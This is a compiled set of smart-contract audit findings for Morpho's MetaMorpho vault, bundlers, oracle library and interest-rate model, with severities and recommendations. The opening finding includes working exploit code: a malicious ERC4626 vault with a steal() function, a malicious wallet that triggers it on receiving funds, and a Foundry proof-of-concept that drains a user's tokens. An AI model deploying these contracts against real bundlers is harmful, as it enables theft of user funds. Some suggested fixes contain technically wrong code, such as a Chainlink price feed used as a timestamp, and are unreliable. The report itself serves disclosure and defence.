![images/BundlerAttack.png](https://gist.github.com/assets/58374099/8e4ec0f8-adc9-4dba-9ca2-0a6c26a4ab9d)

In this attack scenario, an attacker can exploit the vulnerability to steal a user's funds by merely receiving a transfer and abusing the vulnerability when they gain control of the execution in their `receive` function. The malicious ERC4626 vault has been modified for this attack:

<details>

```solidity
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract MaliciousERC4626V2{
	mapping(address => uint256) private _balances;
	address public owner;
	address public asset;
	address public bundler;
	
	constructor(address _asset, address _bundler) {
		owner = msg.sender;
		asset = _asset;
		bundler = _bundler;
	}
	
	function deposit(uint256 amount, address account) external returns (uint256) {
		IERC20(asset).transferFrom(msg.sender, owner, amount);
		return 0;
	}
	
	function maxDeposit(address account) external view returns (uint256) {
		return type(uint256).max;
	}
	
	function balanceOf(address account) external view returns (uint256) {
		return _balances[account];
	}
	
	function steal() external {
		//This function could be used when an attacker uses a direct call to drain
		IERC20(asset).transferFrom(bundler, owner, IERC20(asset).balanceOf(bundler));
	}
	
	//All other ERC4626 functionalities are removed for simplicity but would be present in a real malicious vault
}
```

</details>

This attack path unfolds as follows:

1. Attacker deploys the same malicious vault.
2. Attacker deploys his malicious smart contract wallet.
3. Attacker deposits 1 wei into the vault to give it an infinite allowance from the bundler.
4. User transfers ETH to the attacker's wallet using the bundler.
5. Attacker enters the vault and steals all remaining funds in the bundler.
6. User's transfers still pass, and the transaction gets finalized.

For this vulnerability, a simple malicious smart contract wallet has been developed, which the attacker uses to exploit the issue:

<details>

```solidity
pragma solidity ^0.8.0;

contract MaliciousWallet {
    address private vault;

    constructor(address _vault) {
        vault = _vault;
    }

    receive() external payable {
        vault.call(abi.encodeWithSignature("steal()"));
    }
}
```

</details>

In the following POC, the complete exploit is demonstrated:

<details>

```solidity
function testDrainByApprovalComplex() public
{
    //------------------SETUP-----------------------//
    address user = vm.addr(456);
    address user2 = vm.addr(156);
    address attacker = vm.addr(789);
    MarketParams memory marketParams = _randomMarketParams(123);

    deal(marketParams.loanToken, user, 100);
    deal(marketParams.loanToken, attacker, 1);
    vm.deal(user, 100);

    assertEq(ERC20(marketParams.loanToken).balanceOf(attacker), 1, "SETUP: attacker.balanceOf(loanToken)");
    assertEq(ERC20(marketParams.loanToken).balanceOf(user), 100, "SETUP: attacker.balanceOf(loanToken)");
    assertEq(address(bundler).balance, 0, "SETUP: bundler.balance");

    //------------------TEST-----------------------//

    //First the attacker deploys his malicious vault
    vm.startPrank(attacker);
    MaliciousERC4626V2 attackerVault = new MaliciousERC4626V2(marketParams.loanToken, address(bundler));

    //Now he also deploys his malicious wallet
    MaliciousWallet attackerWallet = new MaliciousWallet(address(attackerVault));

    //Now the attacker grants the max allowance to his vault
    ERC20(marketParams.loanToken).transfer(address(bundler), 1);
    bundle.push(_erc4626Deposit(address(attackerVault), 1, 0, user));
    bundler.multicall(bundle);
    bundle.pop();

    vm.stopPrank();

    vm.startPrank(user);
    ERC20(marketParams.loanToken).transfer(address(bundler), 100);

    //user wants to transfer 100 wei to the attacker and 100 tokens to his friend (user2)
    bundle.push(_nativeTransfer(address(attackerWallet), 100));
    bundle.push(_erc20Transfer(marketParams.loanToken, user2, 100));

    //Now he run the calls
    bundler.multicall{value: 100}(bundle);

    vm.stopPrank();

    //attacker got all the tokens
    assertEq(ERC20(marketParams.loanToken).balanceOf(attacker), 101, "attacker.balanceOf(loanToken)");

    //user2 didn't get any tokens
    assertEq(ERC20(marketParams.loanToken).balanceOf(user2), 0, "user2.balanceOf(loanToken)");
}
```

</details>

The testcase can be executed by adding it to the `EthereumBundlerEthereumTest.col`file, adding the import for the vault `import {MaliciousERC4626V2} from "./helpers/MaliciousERC4626V2.sol";` as well as the wallet `import {MaliciousWallet} from "./helpers/MaliciousWallet.sol";` and running it using `forge test -vvvv --match-test "testDrainByApprovalComplex"`.

- Recommended Mitigation Steps

To address the identified vulnerability, it is strongly recommended to implement one of the following mitigation strategies:

- 1. Dynamic Allowance Reset

The issue can be effectively mitigated by incorporating a dynamic allowance reset mechanism. After each external call requiring an allowance, the contract should include the following sequence:

```solidity
_approveMaxTo(target);
target.externalCall();
token.approve(target, 0);
```

This ensures that the allowance is promptly revoked, minimizing the window of vulnerability. This approach provides a granular and precise control over allowances, preventing potential misuse.

- 2. Grant Minimum Necessary Allowance

An alternative and simplified approach involve granting the minimum necessary allowance to the external address for each specific call. This ensures that, at the conclusion of each multicall, allowances are automatically reset to zero. By adopting this strategy, unnecessary and potentially risky infinite allowances are avoided, reducing the attack surface.



### Fee recipient accrue interest on bad debt while it should not	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L907-L907](metamorpho/src/MetaMorpho.sol#L907-L907)

Fee recipient receives fee shares each time the `_accrueFee` function is called and vault positions accrue some interest on vault's markets, for example when vault users mint or burn their shares. 
However, not all accrued interest in Morpho Blue would result in profit for suppliers - in case the position is liquidated, bad debt realization would take place, reducing suppliers' positions. At the same time, `feeReceipent` shares would remain the same meaning it's "protected" from bad debt risks. This could cause losses for vault users.

The next test added to `metamorpho/test/forge/ERC4626Test.sol` could show scenarios when the fee recipient receives a portion of users' position as a fee:
```solidity
    function testBadDebtOnlyPayedByUsers() public {
        _setFee(0.5 ether);
        address feeRecipient = address(vault.feeRecipient());
 
        uint256 assets = 1 ether;
        uint256 shares = vault.convertToShares(assets);

        loanToken.setBalance(SUPPLIER, type(uint128).max);
        vm.prank(SUPPLIER);
        vault.mint(shares, SUPPLIER);
        
        address borrower = makeAddr("borrower");
        vm.startPrank(borrower);
        collateralToken.setBalance(borrower, type(uint128).max);
        collateralToken.approve(address(morpho), type(uint128).max);
        morpho.supplyCollateral(allMarkets[0], 1.3 ether, borrower, "");
        morpho.borrow(allMarkets[0], 1 ether, 0, borrower, borrower);
        vm.stopPrank();
        
        skip(500 days);

        vm.prank(SUPPLIER);
        // Call for minting new fee shares for fee recipient 
        vault.mint(1, SUPPLIER);

        // ====
        address liquidator = makeAddr("liquidator");
        vm.startPrank(liquidator);
        loanToken.setBalance(liquidator, type(uint128).max);
        loanToken.approve(address(morpho), type(uint128).max);
        morpho.liquidate(allMarkets[0], borrower, 1.3 ether, 0, "");
        vm.stopPrank();
        // ====

        //  Uncomment this block and comment previous to compare cases when position is liquidated (bad debt accrued) and in case when borrower repay whole position
        // Market memory market = morpho.market(allMarkets[0].id());
        // vm.startPrank(borrower);
        // loanToken.setBalance(borrower, type(uint128).max);
        // loanToken.approve(address(morpho), type(uint128).max);
        // morpho.repay(allMarkets[0], 0, market.totalBorrowShares, borrower, "");
        // vm.stopPrank();

        vm.startPrank(feeRecipient);
        uint256 feeRecipientWithdrawed = vault.redeem(vault.balanceOf(feeRecipient), feeRecipient, feeRecipient);
        vm.stopPrank();

        vm.startPrank(SUPPLIER);
        uint256 supplierWithdrawed = vault.redeem(vault.balanceOf(SUPPLIER), SUPPLIER, SUPPLIER);
        vm.stopPrank();
        // fee recipient would result in profit while the supplier loses part of position due to bad debt
        emit log_uint(feeRecipientWithdrawed);
        emit log_uint(supplierWithdrawed);
    }
```



### Lack of timelock in action that is agasint the user	_(duplicate of [`setFee` is not time-locked])_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**

In the documentation it outlines that "All actions that may be against users' interests (e.g. enabling a market with a high exposure, increasing the fee) are subject to a timelock of minimum 12 hours.", but this is not the case when the fee is actually set i `MetaMorpho.setFee`

```
    /// @notice Sets the `fee` to `newFee`.
    function setFee(uint256 newFee) external onlyOwner {
        if (newFee == fee) revert ErrorsLib.AlreadySet();
        if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
        if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();

        // Accrue interest using the previous fee set before changing it.
        _updateLastTotalAssets(_accrueFee());

        // Safe "unchecked" cast because newFee <= MAX_FEE.
        fee = uint96(newFee);

        emit EventsLib.SetFee(_msgSender(), fee);
    }

```

There is no timelock in fee change by owner, meaning users automativally start paying for a new fee without any notice(timelock), therefore taking from the users profits which is clearly agasint the user as states by the developers, as it affect the users funds at accruel. 

**Recommendation** 

Add a time lock to changing of vault fees. 




### Reentrancy Vulnerability in _updateLastTotalAssets within redeem Function	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**
The _updateLastTotalAssets function in the provided code lacks a proper reentrancy guard, making it susceptible to reentrancy attacks. In the redeem function, an attacker could potentially exploit this vulnerability by repeatedly calling _updateLastTotalAssets within the same transaction, leading to unexpected behavior and manipulation of the total assets balance.

The absence of a reentrancy guard allows an attacker to recursively re-enter the _updateLastTotalAssets function before the previous calls have completed. In the context of the redeem function, this could result in multiple updates to the lastTotalAssets state variable within a single transaction, causing discrepancies in the total assets calculation and potentially leading to an inaccurate representation of the user's balance.
**Recommendation**

add a modifier noReentrancy or a manual _lock.



## Medium risk
### Oracle may pass health check when price staleness or manipulation occurs	_(duplicate of [Unhandled revert could lock price oracle access])_

**Severity:** Medium risk

**Context:** [ChainlinkDataFeedLib.sol#L20-L27](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L20-L27)

- Description

The `getPrice()` function is a gateway between morpho contracts and their ltv calculations and chainlink oracle price feeds. This usage of the chainlink api ignores the volatility and dynamic nature of off-chain data requests that could yield invalid / unwanted / incorrect results that may dramatically impact borrower health checks.

The `latestRoundData()` returns the following information: `returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);`

The following missing checks allow for chainlink oracles to impact health checks elsewhere in the protocol;

1. getPrice doesn't implement adequate checks for price staleness
2. getPrice does not validate for prices between last few rounds, therefore allows for round price manipulation
3. getPrice does not validate if price exceeds a tolerable difference

These three issues are combined as one, and placed as a medium issue as they all relate to the same code block, the same impact. Manipulating chainlink oracles cannot be placed into a likelihood of HIGH as such the overall severity is reduced.

- Recommendation

It is important to consider that if price checks revert, they will potentially break health checks, however passing health checks when system should be reverting is far more catastrophic as it could damage overall protocol health. The following cases could be beneficial;

1.  Providing reverts when price % change has dramatically changed or staleness is present.
2. Adding functionality that checks against the last 2 round data responses.
3. Adding a fallback oracle solution as in the case of eBTC by Badger Dao



### Oracle functionality does not handle multisig based reverts	_(duplicate of [Unhandled revert could lock price oracle access])_

**Severity:** Medium risk

**Context:** [ChainlinkDataFeedLib.sol#L23-L23](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L23-L23)

- Description

`feed.latestRoundData()` makes a call to a chainlink `AggregatorV3Interface contract which calls the `AccessControlledOffchainAggregator` contracts and subsequently `EACAggregatorProxy` contracts must always be queried. Multisig accounts can cause these calls to revert, causing denial of service which will directly impact interest accrual, borrowing and withdrawing collateral. 

- Recommendation

These calls are recommended to be wrapped in a try catch block where the error is managed by requesting from a backup oracle.



### Don't check chainlink's latestRoundData return stale or incorrect result	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [ChainlinkDataFeedLib.sol#L24-L24](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L24-L24)

**Description**:

The code oracle doesn't check whether ChainLink oracle return data is stale or not. In some cases, it maybe return a stale price but the contract doesn't check whether the price is stale or not.


**Recommendation**:

Check if the return value is stale or not.

```solidity
(uint80 roundID, int256 answer, uint256 timestamp, uint256 updatedAt, ) = feed.latestRoundData();

require(updatedAt >= roundID, "Stale price");
require(timestamp != 0,"Round not complete");
require(answer > 0,"Chainlink answer reporting 0");

require(updatedAt >= block.timestamp - maxDelayTime, "price outdated");

return answer;
```




### Missing important check if `repay` and `redeem` functions in `CompoundV2MigrationBundler.sol` are successful

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Description

In `CompoundV2MigrationBundler.sol` we have `compoundV2Repay()` and `compoundV2Redeem()`:
```solidity
    function compoundV2Repay(address cToken, uint256 amount) external payable protected {
        if (cToken == C_ETH) {
            amount = Math.min(amount, address(this).balance);

            require(amount != 0, ErrorsLib.ZERO_AMOUNT);

            ICEth(C_ETH).repayBorrowBehalf{value: amount}(initiator());
        } else {
            address underlying = ICToken(cToken).underlying();

            if (amount != type(uint256).max) amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));

            require(amount != 0, ErrorsLib.ZERO_AMOUNT);

            _approveMaxTo(underlying, cToken);

            ICToken(cToken).repayBorrowBehalf(initiator(), amount);
        }
    }
```

```solidity
    function compoundV2Redeem(address cToken, uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(cToken).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        ICToken(cToken).redeem(amount); //@audit - not check return value
    }
```

- **`compoundV2Repay()`**: Repays a borrow position on Compound V2.
- **`compoundV2Redeem()`**: Redeems assets from a cToken position on Compound V2. It calculates the redeemable amount based on the bundler's cToken balance and then calls the `redeem` function of the cToken contract.

The problem here is that `compoundV2Repay()` calls `repayBorrowBehalf` and `compoundV2Redeem()` calls `redeem()`. These functions on failure will not rollback the transaction but return 0 or `Error Code`. 
You can see the docs for [repayBorrowBehalf](https://docs.compound.finance/v2/ctokens/#repay-borrow-behalf) and [redeem](https://docs.compound.finance/v2/ctokens/#redeem).

One small disclaimer is that with `repayBorrowBehalf()` at `C_ETH` the function will revert if the transaction fails:

> `RETURN`: No return, reverts on error.

- Recommended Mitigation Steps

You should always make sure that these functions will not fail without reverting.
Therefore it is mandatory to check the returned value and revert the transaction if unsuccessful.



### Always check for ChainLink correctness 	_(duplicate of [Don't check chainlink's latestRoundData return stale or incorrect result])_

**Severity:** Medium risk

**Context:** [ChainlinkDataFeedLib.sol#L20-L20](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L20-L20)

- Summary 
Although developers can assume that staleness and price checks are not checked , it's always best to check not assume.

- Proof of concept
From the comments above we can see that the devs made a few assumptions about the ChainLink oracle

>    /// - Staleness is not checked because it's assumed that the Chainlink feed keeps its promises on this.

>    /// - The price is not checked to be in the min/max bounds because it's assumed that the Chainlink feed keeps its 

However these assumptions are not always rights and sometimes can cause huge issues. Example is the [Luna crash](https://www.forbes.com/sites/qai/2022/09/20/what-really-happened-to-luna-crypto/) when the ChainLink price feed went to the lower bound and started reporting the same price, even though Luna was crashing down. The likelihood of such case is low (maybe once every year or two) however when it does happen if there are no checks to stop it the markets will be exploited. One simple scenario is:

1. tokenA goes bellow the low bound
2. Users buy it from UniSwap and use it as collateral to borrow another token on Morpho
3. The Morpho Market suffers as it is profitable to buy at a way lower price and borrow here against it.

- Recommended solution

```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
       if (address(feed) == address(0)) return 1;

-      (, int256 answer,,,) = feed.latestRoundData();
+      (uint80 roundId, int256 answer, , , uint80 answeredInRound) = priceFeed.latestRoundData();

+      require(answeredInRound >= roundId, ErrorsLib.STALE_PRICE );
+      require (lowerBound < price < upperBound, ErrorsLib.OUTSIDE_RANGE );
       require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);
        

        return uint256(answer);
    }
```




### ExpLib.wExp has an exploitable 1.4% precision error

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The `ExpLib.wExp` function calculates $e^x$ by splitting the operation in to `q` larger leaps and a remainder `r` that is then approximated with a second-order Taylor polynomial.

If we look closely at what happens at `wExp(x)` where `x` is in the neighborhood of one of these leaps, we have the Taylor polynomial operating at its max distance from its origin, and consequently its max imprecision.

Plotting the relative error of the second-order polynomial as $\frac{e^x}{1+x+\frac{x^2}{2}}-1$, we see that when we are immediately before a new `q` leap, so $x = \frac{ln(2)}{2} - ε$, the polynomial under-estimates the output by about 0.5%; on the opposite side, where $x = -\frac{ln(2)}{2} + ε$, it overestimates it by about 0.9%. 

![plot](https://user-images.githubusercontent.com/145972240/284844577-fe50c153-7a66-49a3-b6fc-b31410305524.png)

This creates a 1.4% leap in the output that can be exploited by fine-tuning the input to sit on the profitable side for the caller; for example, a MEV bot could find the right `block.timestamp` to accrue interest when the math is in their favor.

Some numerical examples that show the high numerical impact of a 1-wei change in the input are:
- in the neighborhood of `1e18`:
  - `wExp(1039720770839917963) = 2813260434039495662`; 
  - `wExp(1039720770839917964) = 2853932145839210092`; 
- in the neighborhood of `10e18`:
  - `wExp(10050634118119206980) = 23046229475651548463104`; 
  - `wExp(10050634118119206981) = 23379412138714809073664`; 

**Recommendation**:
Consider adding a third-order to the Taylor polynomial, which has the double positive effect of:
- reducing the max error from 0.9% to 0.07%
- yielding a slight underestimation on both sides, so the end-result approximation is more continuous across leaps



### Timestamp Manipulation Vulnerability in IRM's borrowRate Function, Exposing Potential Frontrunning Exploits	_(duplicate of [Timestamp manipulation vulnerability in `_borrowRate` function])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Severity**

Medium

**Relevant GitHub Links**

https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L140C35-L140C35

**Summary**

The IRM contract `AdaptiveCurveIrm` is susceptible to time manipulation, as it relies on `block.timestamp` for interest rate calculations. This vulnerability opens the possibility of miners or external actors manipulating the borrow rate, leading to potential exploitation and unjust acquisition of high interest rates.

**Vulnerability Details**

The IRM contract is vulnerable to time manipulation, enabling miners to front-run the `borrowRate` function and manipulate interest rates for personal gain.

**Impact**

Potential manipulation of interest rates by miners could lead to financial losses and instability in the protocol.

**POC**

* Imagine a situation where a miner sets the time in their block to be much higher than the real time.
* The `borrowRate` function, using this manipulated time, would think a lot of time has passed since the last update and might calculate a higher interest rate than it should.


**Tools used**

- Manual review

**Recommendations**

Implement a decentralized and secure time-dependent mechanism for interest rate calculations, such as using on-chain oracles for time verification, to mitigate the risk of manipulation by miners and prevent frontrunning. Additionally, consider using block delta time instead of relying solely on `block.timestamp` to enhance accuracy and reduce susceptibility to timestamp irregularities. Regularly update the contract to minimize the impact of time-dependent calculations on interest rates.

One of the popular on-chain oracles for obtaining timestamps include Chainlink:

**Chainlink:** Chainlink is a widely used decentralized oracle network that provides various data feeds, including timestamps. Developers can use Chainlink oracles to securely fetch external information, such as the current timestamp, and integrate it into their smart contracts.

Here's a simple example of how you might integrate Chainlink as an on-chain oracle to obtain the current timestamp in your Solidity code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract MyContract {
    AggregatorV3Interface internal priceFeed;

    constructor(address _priceFeed) {
        priceFeed = AggregatorV3Interface(_priceFeed);
    }

    function getCurrentTimestamp() external view returns (uint256) {
        // Get the latest round data from Chainlink price feed
        (, int256 answer, , ,) = priceFeed.latestRoundData();

        return uint256(answer);
    }
}
```

In this example, you need to deploy your contract with the address of a specific Chainlink price feed as a constructor parameter. The `getCurrentTimestamp` function uses Chainlink's `latestRoundData` function to fetch the latest timestamp provided by the oracle. Note that this is a simplified example, and you should adapt it based on your specific use case and the type of data you need.




### MetaMorpho doesn't support fee on transfer tokens	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
`MetaMorpho` contract isn't compatible with fee on transfer tokens. User will not be able to deposit using such token, as [after deposit](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L696) balance of contract will not be enough [to execute supply](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L698), as some amount will be charged as fee.

- Impact
User will not be able to use fee on transfer tokens with MetaMorpho vault.
- Recommended Mitigation Steps
Looks like such tokens should not be supported at all as they will always lose some value during transfer between user, vault and market.



### ERC4626Bundler will not handle slippage correctly in case if assets/shares amount will be changed	_(duplicate of [Undesired slippage check in `erc4626Deposit`])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
ERC4626Bundler is implemented to allow users to do operations with erc4626 vaults. So using this bundle deposit, withdraw, mint and redeem operations are available.

Let's check code of `erc4626Deposit` function.
https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L53-L72
```solidity
    function erc4626Deposit(address vault, uint256 assets, uint256 minShares, address receiver)
        external
        payable
        protected
    {
        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);
        /// Do not check `receiver != address(this)` to allow the bundler to receive the vault's shares.

        address asset = IERC4626(vault).asset();

        assets = Math.min(assets, IERC4626(vault).maxDeposit(receiver));
        assets = Math.min(assets, ERC20(asset).balanceOf(address(this)));

        require(assets != 0, ErrorsLib.ZERO_AMOUNT);

        _approveMaxTo(asset, vault);

        uint256 shares = IERC4626(vault).deposit(assets, receiver);
        require(shares >= minShares, ErrorsLib.SLIPPAGE_EXCEEDED);
    }
```
This function deposits assets into `vault` and then received amount of shares is compared with `minShares` as slippage protection.
Before assets are deposited, they are adjusted according to the `maxDeposit` function. As result, in case if `maxDeposit` is smaller than amount of assets that user wanted to deposit, then `assets` is set to the `maxDeposit` amount.

As result, `shares` received from vault will be smaller than `minShares` and function will revert.

If we look into `erc4626Mint` function, then we will see, that `shares` value [is adjusted in same way](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L36). But in this case function will not revert as received `assets` will likely be smaller than `maxAssets`, which means that [slippage check will pass](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L43). However, such slippage check is incorrect as it simply do not work.
- Impact
ERC4626Bundler slippage protection mechanisms will not work in case if assets/shares will be adjusted becuase of maxDeposit/maxWithdraw. In some cases function will revert and in some cases they will not be able to check slippage correctly.
- Recommended Mitigation Steps
In case if you adjust assets/shares, then you also need to decrease slippage param proportionally.



### MetaMorphoFactory.createMetaMorpho() is subject to the reorg attack. 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
MetaMorphoFactory.createMetaMorpho() is subject to the reorg attack.  The main reason is that ``salt`` is provided by the user, and during a reorg, any user can provide the same ``salt`` value.

UrdFactory.createUrd() is also subject to the reorg attack. When this happens, the ownership might be of individual Urd contract might be stolen and then leads to the stealing of rewards.



The createMetaMorpho function deploys a MetaMorpho contract using a salt that is specified from the input, where the address derivation depends only on the this salt value given that the address of the factory and bytecode for MORPHO are already fixed. 

Meanwhile, reorgs occur all the time on L2 and sometimes on L1:

[https://polygonscan.com/blocks_forked](https://polygonscan.com/blocks_forked)

[https://decrypt.co/101390/ethereum-beacon-chain-blockchain-reorg](https://decrypt.co/101390/ethereum-beacon-chain-blockchain-reorg)

Attack scenario: 
Suppose Frank runs createMetaMorpho() to create a MetaMorpho but due to an reorg, the transanscation was reversed. Frank assumed his transaction was successful since he already received the confirmation.  Steve, seeing the reorg occurs, run createMetaMorpho() with the same salt but with the argument of ``initialOwner" to be himself. As a result, Steve becomes the owner of the MetaMorpho contract that Frank thought he is in control. Steve can then steal funds or use his pillages to take advantage of the contract later. 


**Recommendation**:
Deploy MetaMorpho via create2 with a specific salt that is the keccack hash of msg.sender and some number. In this way, nobody can provide the same salt value except the original msg.sender since nobody else has the same msg.sender address.



### Metamorpho: DoS on `_withdrawMorpho` when `assets` is bigger than largest market position within the vault 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Context:**

https://github.com/morpho-org/metamorpho/blob/main/src/MetaMorpho.sol#L823C1-L845C1

**Description:**

The issue arises when a user attempts to withdraw an amount from the Metamorpho vault that exceeds the largest individual market position within the vault. In such cases, the transaction consistently fails, preventing the user from withdrawing liquidity from MorphoBlue markets.

Example Scenario:
1. The Metamorpho DAI vault comprises five markets, each with 10,000 DAI.
2. A user requests to withdraw 11,000 DAI, an amount greater than any single market's position. The `_maxWithdraw` function will return 11,000 DAI to this user.
3. The `withdraw()` function is called for 11,000 DAI, but the transaction fails with a `NotEnoughLiquidity` error.

This failure occurs because the vault attempts to withdraw using the `assets` input, but this approach is problematic for full positions withdrawals due to discrepancies in conversion between shares and assets. The `IMorpho` documentation advises using the `shares` input for full position withdrawals to avoid such issues:

```solidity
/// @dev It is advised to use the `shares` input when withdrawing the full position to avoid reverts due to
/// conversion roundings between shares and assets.
```

In the function `_withdrawMorpho()`, the `assets` input is always used, which leads to transaction reversion in scenarios like the one described. This is because all `MORPHO.withdraw()` calls will fail and at the end of the function `assets != 0` so transaction will revert with a `NotEnoughLiquidity` error. 

```solidity
function _withdrawMorpho(uint256 assets) internal {
    for (uint256 i; i < withdrawQueue.length; ++i) {
        Id id = withdrawQueue[i];
        MarketParams memory marketParams = _marketParams(id);
        (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);

        uint256 toWithdraw = UtilsLib.min(
            _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
        );

        if (toWithdraw > 0) {
            // Using try/catch to skip markets that revert.
            try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {
                assets -= toWithdraw;
            } catch {}
        }

        if (assets == 0) return;
    }

    if (assets != 0) revert ErrorsLib.NotEnoughLiquidity();
}
```

In our example, since all markets have positions less than 11,000 DAI, the `toWithdraw` amount defaults to `supplyAssets`. This will make revert all `MORPHO.withdraw()` calls leading to the transaction revert at the end of the function. 

**Recommendation:**

A potential solution is to modify the withdrawal process to utilize the `shares` input instead of `assets` when withdrawing the full position from a market. This approach can help avoid the rounding issue that causes the transaction to revert.

Here is a suggested code modification to implement this solution:

```diff
-   (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);
+   (uint256 supplyAssets, uint256 supplyShares, Market memory market) = _accruedSupplyBalance(marketParams, id);

    uint256 toWithdraw = UtilsLib.min(
        _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
    );

    if (toWithdraw > 0) {
+       if(toWithdraw == supplyAssets) {
+           try MORPHO.withdraw(marketParams, 0, supplyShares, address(this), address(this)) {
+               assets -= toWithdraw;
+           } catch {}
+       } else {
            // Using try/catch to skip markets that revert.
            try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {
                assets -= toWithdraw;
            } catch {}
+       }
    }
```




### Missing timelock when changing the fee	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L242-L242](metamorpho/src/MetaMorpho.sol#L242-L242)

- Description
According to the [Metamorpho docs](https://github.com/morpho-org/metamorpho/blob/main/README.md#owner), the owner should be able to change the fee to a new one under a timelock. 

*[Timelocked with no possible veto] Set the performance fee (capped to 50%).*

The **Metamorpho.setFee()** function does not implement a timelock. It allows the owner to directly set the new fee. 

```solidity
   function setFee(uint256 newFee) external onlyOwner {
        if (newFee == fee) revert ErrorsLib.AlreadySet();
        if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
        if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();

        // Accrue interest using the previous fee set before changing it.
        _updateLastTotalAssets(_accrueFee());

        // Safe "unchecked" cast because newFee <= MAX_FEE.
        fee = uint96(newFee);

        emit EventsLib.SetFee(_msgSender(), fee);
    }
```
- Recommendation
Add a timelock to the **Metamorpho.setFee()** function.



### The guardian can remove the pending guardian, allowing him to maintain control over his role	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L460-L460](metamorpho/src/MetaMorpho.sol#L460-L460)

- Summary
Only the owner has the power to submit a new guardian, however, the current guardian can revoke the submission of the new one, thus retaining their role.

- Proof of Concept
Morpho has a role hierarchy where the owner is at the top, and other roles are below. Currently, only the owner can change the guardian of a vault by [submitting](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8) a pending one. After the `timelock` has passed, the new guardian can claim the role, removing the old one from their position. However, the current guardian can [revokePendingGuardian](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8) instantly and remove the pending one. This way, if the current guardian consistently removes the pending guardian that the owner submits, they can retain their role indefinitely. Additionally, the guardian has the power over the new `timelock` and, more precisely, the power to [remove](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8) it.

These two functionalities give the guardian too much control over their own role, as they can keep a long timeLock to have the time to revoke the pending guardian.

- Recommended Solution
I suggest that roles are managed not by themselves, but by the roles above – the owner manages the guardian. This can be achieved by removing the permission for the guardian to revoke their own replacement.

```diff
-   function revokePendingGuardian() external onlyGuardianRole {
+   function revokePendingGuardian() external onlyOwner {
        if (pendingGuardian.validAt == 0) revert ErrorsLib.NoPendingValue();

        delete pendingGuardian;

        emit EventsLib.RevokePendingGuardian(_msgSender());
    }
```



### Share price manipulation	_(duplicate of [Suppliers can frontrun forced market removal and losses])_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L560-L560](metamorpho/src/MetaMorpho.sol#L560-L560)

Owner/Curator can manipulate share price by removing and reintroducing market bringing centralization risks

Steps
1. Assume current totalAsset is 100
2. Market M1 with supply asset of 20 is removed from withdrawQueue
3. This brings totalAsset to 80
4. This means the share prices drops
5. Admin/Curator can buy at this discounted prices
6. Once they have bought they can reallocate the supply of removed market to another active market bringing totalAsset back to 100
7. This brings share prices to initial price which is higher than what Admin bought
8. Admin can instantly withdraw at profit

Recommendation:
